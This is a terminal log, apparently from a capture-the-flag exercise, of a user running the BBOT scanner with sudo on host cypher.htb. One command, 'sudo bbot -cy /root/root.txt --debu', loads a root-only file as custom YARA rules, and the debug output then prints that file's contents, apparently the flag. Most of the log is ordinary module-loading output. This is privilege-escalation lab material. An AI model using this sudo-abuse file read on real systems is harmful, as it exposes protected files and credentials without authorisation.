[DBUG] output.stdout: Queueing SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c5113216be1',
 'name': 'enigmatic_grego...", module=TARGET, tags={'in-scope'}) because precheck succeeded
[DBUG] output.txt: Queueing SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c5113216be1', 'n
ame': 'enigmatic_grego...", module=TARGET, tags={'in-scope'}) because precheck succeeded
[VERB] False
[DBUG] output.csv: Got SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c5113216be1', 'name':
 'enigmatic_grego...", module=TARGET, tags={'in-scope'}) from TARGET
[DBUG] output.csv: SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c5113216be1', 'name': 'en
igmatic_grego...", module=TARGET, tags={'in-scope'}) passed post-check
[DBUG] output.csv: Not accepting SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c5113216be1
', 'name': 'enigmatic_grego...", module=TARGET, tags={'in-scope'}) because module has alread
y seen it
[DBUG] output.json: Got SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c5113216be1', 'name'
: 'enigmatic_grego...", module=TARGET, tags={'in-scope'}) from TARGET
[DBUG] output.json: SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c5113216be1', 'name': 'e
nigmatic_grego...", module=TARGET, tags={'in-scope'}) passed post-check
[DBUG] output.json: Handling SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c5113216be1', '
name': 'enigmatic_grego...", module=TARGET, tags={'in-scope'})
[DBUG] output.json: Finished handling SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c51132
16be1', 'name': 'enigmatic_grego...", module=TARGET, tags={'in-scope'})
[DBUG] output.stdout: Got SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c5113216be1', 'nam
e': 'enigmatic_grego...", module=TARGET, tags={'in-scope'}) from TARGET
[DBUG] output.stdout: SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c5113216be1', 'name': 
'enigmatic_grego...", module=TARGET, tags={'in-scope'}) passed post-check
[DBUG] output.stdout: Handling SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c5113216be1',
 'name': 'enigmatic_grego...", module=TARGET, tags={'in-scope'})
[DBUG] output.stdout: Finished handling SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c511
3216be1', 'name': 'enigmatic_grego...", module=TARGET, tags={'in-scope'})
[DBUG] output.txt: Got SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c5113216be1', 'name':
 'enigmatic_grego...", module=TARGET, tags={'in-scope'}) from TARGET
[DBUG] output.txt: SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c5113216be1', 'name': 'en
igmatic_grego...", module=TARGET, tags={'in-scope'}) passed post-check
[DBUG] output.txt: Handling SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c5113216be1', 'n
ame': 'enigmatic_grego...", module=TARGET, tags={'in-scope'})
[DBUG] output.txt: Finished handling SCAN("{'id': 'SCAN:48e2ca3881fb654180f79bc76b208c511321
6be1', 'name': 'enigmatic_grego...", module=TARGET, tags={'in-scope'})
[VERB] True
[SUCC] Scan enigmatic_gregory completed in 0 seconds with status FINISHED
[DBUG] Cancelling all scan tasks
[DBUG] Finished cancelling all scan tasks
[DBUG] Awaiting 49 tasks
[DBUG] Awaited 49 tasks
[INFO] aggregate: +----------+------------+------------+
[INFO] aggregate: | Module   | Produced   | Consumed   |
[INFO] aggregate: +==========+============+============+
[INFO] aggregate: | None     | None       | None       |
[INFO] aggregate: +----------+------------+------------+
[VERB] aggregate: Wrote scan-stats to /root/.bbot/scans/enigmatic_gregory/scan-stats-table-2
0250304_0749_04.txt
[INFO] output.csv: Saved CSV output to /root/.bbot/scans/enigmatic_gregory/output.csv
[INFO] output.json: Saved JSON output to /root/.bbot/scans/enigmatic_gregory/output.json
[INFO] output.txt: Saved TXT output to /root/.bbot/scans/enigmatic_gregory/output.txt
[DBUG] No words to save
[DBUG] Setting scan status to CLEANING_UP
graphasm@cypher:~$ sudo /usr/local/bin/bbot -cy /root/root.txt --debu
  ______  _____   ____ _______
 |  ___ \|  __ \ / __ \__   __|
 | |___) | |__) | |  | | | |
 |  ___ <|  __ <| |  | | | |
 | |___) | |__) | |__| | | |
 |______/|_____/ \____/  |_|
 BIGHUGE BLS OSINT TOOL v2.1.0.4939rc

www.blacklanternsecurity.com/bbot

[DBUG] Preset bbot_cli_main: Adding module "json" of type "output"
[DBUG] Preset bbot_cli_main: Adding module "csv" of type "output"
[DBUG] Preset bbot_cli_main: Adding module "txt" of type "output"
[DBUG] Preset bbot_cli_main: Adding module "python" of type "output"
[DBUG] Preset bbot_cli_main: Adding module "stdout" of type "output"
[DBUG] Preset bbot_cli_main: Adding module "aggregate" of type "internal"
[DBUG] Preset bbot_cli_main: Adding module "dnsresolve" of type "internal"
[DBUG] Preset bbot_cli_main: Adding module "cloudcheck" of type "internal"
[DBUG] Preset bbot_cli_main: Adding module "excavate" of type "internal"
[DBUG] Preset bbot_cli_main: Adding module "speculate" of type "internal"
[VERB] 
[VERB] ### MODULES ENABLED ###
[VERB] 
[VERB] +------------+----------+-----------------+-------------------------------+----------
-----+----------------------+--------------------+
[VERB] | Module     | Type     | Needs API Key   | Description                   | Flags    
     | Consumed Events      | Produced Events    |
[VERB] +============+==========+=================+===============================+==========
=====+======================+====================+
[VERB] | csv        | output   | No              | Output to CSV                 |          
     | *                    |                    |
[VERB] +------------+----------+-----------------+-------------------------------+----------
-----+----------------------+--------------------+
[VERB] | json       | output   | No              | Output to Newline-Delimited   |          
     | *                    |                    |
[VERB] |            |          |                 | JSON (NDJSON)                 |          
     |                      |                    |
[VERB] +------------+----------+-----------------+-------------------------------+----------
-----+----------------------+--------------------+
[VERB] | python     | output   | No              | Output via Python API         |          
     | *                    |                    |
[VERB] +------------+----------+-----------------+-------------------------------+----------
-----+----------------------+--------------------+
[VERB] | stdout     | output   | No              | Output to text                |          
     | *                    |                    |
[VERB] +------------+----------+-----------------+-------------------------------+----------
-----+----------------------+--------------------+
[VERB] | txt        | output   | No              | Output to text                |          
     | *                    |                    |
[VERB] +------------+----------+-----------------+-------------------------------+----------
-----+----------------------+--------------------+
[VERB] | cloudcheck | internal | No              | Tag events by cloud provider, |          
     | *                    |                    |
[VERB] |            |          |                 | identify cloud resources like |          
     |                      |                    |
[VERB] |            |          |                 | storage buckets               |          
     |                      |                    |
[VERB] +------------+----------+-----------------+-------------------------------+----------
-----+----------------------+--------------------+
[VERB] | dnsresolve | internal | No              |                               |          
     | *                    |                    |
[VERB] +------------+----------+-----------------+-------------------------------+----------
-----+----------------------+--------------------+
[VERB] | aggregate  | internal | No              | Summarize statistics at the   | passive, 
safe |                      |                    |
[VERB] |            |          |                 | end of a scan                 |          
     |                      |                    |
[VERB] +------------+----------+-----------------+-------------------------------+----------
-----+----------------------+--------------------+
[VERB] | excavate   | internal | No              | Passively extract juicy       | passive  
     | HTTP_RESPONSE,       | URL_UNVERIFIED,    |
[VERB] |            |          |                 | tidbits from scan data        |          
     | RAW_TEXT             | WEB_PARAMETER      |
[VERB] +------------+----------+-----------------+-------------------------------+----------
-----+----------------------+--------------------+
[VERB] | speculate  | internal | No              | Derive certain event types    | passive  
     | AZURE_TENANT,        | DNS_NAME, FINDING, |
[VERB] |            |          |                 | from others by common sense   |          
     | DNS_NAME,            | IP_ADDRESS,        |
[VERB] |            |          |                 |                               |          
     | DNS_NAME_UNRESOLVED, | OPEN_TCP_PORT,     |
[VERB] |            |          |                 |                               |          
     | HTTP_RESPONSE,       | ORG_STUB           |
[VERB] |            |          |                 |                               |          
     | IP_ADDRESS,          |                    |
[VERB] |            |          |                 |                               |          
     | IP_RANGE, SOCIAL,    |                    |
[VERB] |            |          |                 |                               |          
     | STORAGE_BUCKET, URL, |                    |
[VERB] |            |          |                 |                               |          
     | URL_UNVERIFIED,      |                    |
[VERB] |            |          |                 |                               |          
     | USERNAME             |                    |
[VERB] +------------+----------+-----------------+-------------------------------+----------
-----+----------------------+--------------------+
[VERB] Loading word cloud from /root/.bbot/scans/hellish_lantern/wordcloud.tsv
[DBUG] Failed to load word cloud from /root/.bbot/scans/hellish_lantern/wordcloud.tsv: [Errn
o 2] No such file or directory: '/root/.bbot/scans/hellish_lantern/wordcloud.tsv'
[INFO] Scan with 0 modules seeded with 0 targets (0 in whitelist)
[WARN] No scan modules to load
[DBUG] Installing json - Preloaded Deps {'modules': [], 'pip': [], 'pip_constraints': [], 's
hell': [], 'apt': [], 'ansible': [], 'common': []}
[DBUG] No dependency work to do for module "json"
[DBUG] Installing speculate - Preloaded Deps {'modules': [], 'pip': [], 'pip_constraints': [
], 'shell': [], 'apt': [], 'ansible': [], 'common': []}
[DBUG] No dependency work to do for module "speculate"
[DBUG] Installing cloudcheck - Preloaded Deps {'modules': [], 'pip': [], 'pip_constraints': 
[], 'shell': [], 'apt': [], 'ansible': [], 'common': []}
[DBUG] No dependency work to do for module "cloudcheck"
[DBUG] Installing excavate - Preloaded Deps {'modules': [], 'pip': [], 'pip_constraints': []
, 'shell': [], 'apt': [], 'ansible': [], 'common': []}
[DBUG] No dependency work to do for module "excavate"
[DBUG] Installing aggregate - Preloaded Deps {'modules': [], 'pip': [], 'pip_constraints': [
], 'shell': [], 'apt': [], 'ansible': [], 'common': []}
[DBUG] No dependency work to do for module "aggregate"
[DBUG] Installing dnsresolve - Preloaded Deps {'modules': [], 'pip': [], 'pip_constraints': 
[], 'shell': [], 'apt': [], 'ansible': [], 'common': []}
[DBUG] No dependency work to do for module "dnsresolve"
[DBUG] Installing csv - Preloaded Deps {'modules': [], 'pip': [], 'pip_constraints': [], 'sh
ell': [], 'apt': [], 'ansible': [], 'common': []}
[DBUG] No dependency work to do for module "csv"
[DBUG] Installing txt - Preloaded Deps {'modules': [], 'pip': [], 'pip_constraints': [], 'sh
ell': [], 'apt': [], 'ansible': [], 'common': []}
[DBUG] No dependency work to do for module "txt"
[DBUG] Installing python - Preloaded Deps {'modules': [], 'pip': [], 'pip_constraints': [], 
'shell': [], 'apt': [], 'ansible': [], 'common': []}
[DBUG] No dependency work to do for module "python"
[DBUG] Installing stdout - Preloaded Deps {'modules': [], 'pip': [], 'pip_constraints': [], 
'shell': [], 'apt': [], 'ansible': [], 'common': []}
[DBUG] No dependency work to do for module "stdout"
[VERB] Loading 0 scan modules: 
[VERB] Loading 5 internal modules: aggregate,cloudcheck,dnsresolve,excavate,speculate
[VERB] Loaded module "aggregate"
[VERB] Loaded module "cloudcheck"
[VERB] Loaded module "dnsresolve"
[VERB] Loaded module "excavate"
[VERB] Loaded module "speculate"
[INFO] Loaded 5/5 internal modules (aggregate,cloudcheck,dnsresolve,excavate,speculate)
[VERB] Loading 5 output modules: csv,json,python,stdout,txt
[VERB] Loaded module "csv"
[VERB] Loaded module "json"
[VERB] Loaded module "python"
[VERB] Loaded module "stdout"
[VERB] Loaded module "txt"
[INFO] Loaded 5/5 output modules, (csv,json,python,stdout,txt)
[VERB] Setting up modules
[DBUG] _scan_ingress: Setting up module _scan_ingress
[DBUG] _scan_ingress: Finished setting up module _scan_ingress
[DBUG] dnsresolve: Setting up module dnsresolve
[DBUG] dnsresolve: Finished setting up module dnsresolve
[DBUG] aggregate: Setting up module aggregate
[DBUG] aggregate: Finished setting up module aggregate
[DBUG] cloudcheck: Setting up module cloudcheck
[DBUG] cloudcheck: Finished setting up module cloudcheck
[DBUG] internal.excavate: Setting up module excavate
[DBUG] internal.excavate: Including Submodule CSPExtractor
[DBUG] internal.excavate: Including Submodule EmailExtractor
[DBUG] internal.excavate: Including Submodule ErrorExtractor
[DBUG] internal.excavate: Including Submodule FunctionalityExtractor
[DBUG] internal.excavate: Including Submodule HostnameExtractor
[DBUG] internal.excavate: Including Submodule JWTExtractor
[DBUG] internal.excavate: Including Submodule NonHttpSchemeExtractor
[DBUG] internal.excavate: Including Submodule ParameterExtractor
[DBUG] internal.excavate: Parameter Extraction disabled because no modules consume WEB_PARAM
ETER events
[DBUG] internal.excavate: Including Submodule SerializationExtractor
[DBUG] internal.excavate: Including Submodule URLExtractor
[DBUG] internal.excavate: Successfully loaded custom yara rules file [/root/root.txt]
[DBUG] internal.excavate: Final combined yara rule contents: 684e719f45ca509ae008b48344c6e0e
8

[DBUG] output.csv: Setting up module csv
[DBUG] output.csv: Finished setting up module csv
[DBUG] output.json: Setting up module json
[DBUG] output.json: Finished setting up module json
[DBUG] output.python: Setting up module python
[DBUG] output.python: Finished setting up module python
[DBUG] output.stdout: Setting up module stdout
[DBUG] output.stdout: Finished setting up module stdout
[DBUG] output.txt: Setting up module txt
[DBUG] output.txt: Finished setting up module txt
[DBUG] internal.speculate: Setting up module speculate
[INFO] internal.speculate: No portscanner enabled. Assuming open ports: 80, 443
[DBUG] internal.speculate: Finished setting up module speculate
[DBUG] _scan_egress: Setting up module _scan_egress
[DBUG] _scan_egress: Finished setting up module _scan_egress
[DBUG] Setup succeeded for aggregate (success)
[DBUG] Setup succeeded for speculate (success)
[DBUG] Setup succeeded for csv (success)
[DBUG] Setup succeeded for stdout (success)
[DBUG] Setup succeeded for cloudcheck (success)
[DBUG] Setup succeeded for _scan_egress (success)
[DBUG] Setup succeeded for _scan_ingress (success)
[DBUG] Setup succeeded for json (success)
[DBUG] Setup succeeded for dnsresolve (success)
[DBUG] Setup succeeded for txt (success)
[DBUG] Setup succeeded for python (success)
[INFO] internal.excavate: Compiling 10 YARA rules
[DBUG] internal.excavate: Finished setting up module excavate
[DBUG] Setup succeeded for excavate (success)
[DBUG] Setting intercept module dnsresolve._incoming_event_queue to previous intercept modul
e _scan_ingress.outgoing_event_queue
[DBUG] Setting intercept module cloudcheck._incoming_event_queue to previous intercept modul
e dnsresolve.outgoing_event_queue
[DBUG] Setting intercept module _scan_egress._incoming_event_queue to previous intercept mod
ule cloudcheck.outgoing_event_queue
[SUCC] Setup succeeded for 12/12 modules.
[TRCE] Command: /usr/local/bin/bbot -cy /root/root.txt --debu
[SUCC] Scan ready. Press enter to execute hellish_lantern
Read from remote host cypher.htb: Connection reset by peer
Connection to cypher.htb closed.
client_loop: send disconnect: Broken pipe
```

